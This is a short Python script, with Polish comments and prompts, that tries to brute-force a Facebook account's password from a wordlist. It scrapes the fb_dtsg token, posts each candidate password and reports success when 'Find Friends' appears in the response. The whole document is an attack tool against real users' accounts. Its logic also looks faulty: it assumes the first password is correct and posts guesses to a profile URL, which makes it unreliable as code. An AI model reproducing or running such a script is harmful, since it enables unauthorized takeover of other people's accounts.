import requests
from bs4 import BeautifulSoup

def get_csrf_token(session):
    response = session.get("https://www.facebook.com/")
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "fb_dtsg"})["value"]
    return csrf_token

def brute_force(email, fb_id, passwords):
    with requests.Session() as session:
        # Logowanie do Facebooka
        login_data = {
            "email": email,
            "pass": passwords[0],  # Zakładamy, że pierwsze hasło jest poprawne
            "login": "Zaloguj się"
        }
        session.post("https://www.facebook.com/login.php", data=login_data)

        # Pobieranie tokenu CSRF
        csrf_token = get_csrf_token(session)

        # Próba złamania hasła
        for password in passwords:
            data = {
                "email": email,
                "pass": password,
                "fb_dtsg": csrf_token,
                "login": "Zaloguj się"
            }

            response = session.post(f"https://www.facebook.com/{fb_id}", data=data)
            if "Find Friends" in response.text:
                print(f"Hasło znalezione: {password}")
                break
            else:
                print(f"Błędne hasło: {password}")

if __name__ == "__main__":
    email = input("Podaj adres e-mail (jako nazwę użytkownika): ")
    fb_id = input("Podaj identyfikator Facebooka: ")
    password_file = input("Podaj nazwę pliku z hasłami: ")

    with open(password_file, "r") as file:
        passwords = [line.strip() for line in file]

    brute_force(email, fb_id, passwords)
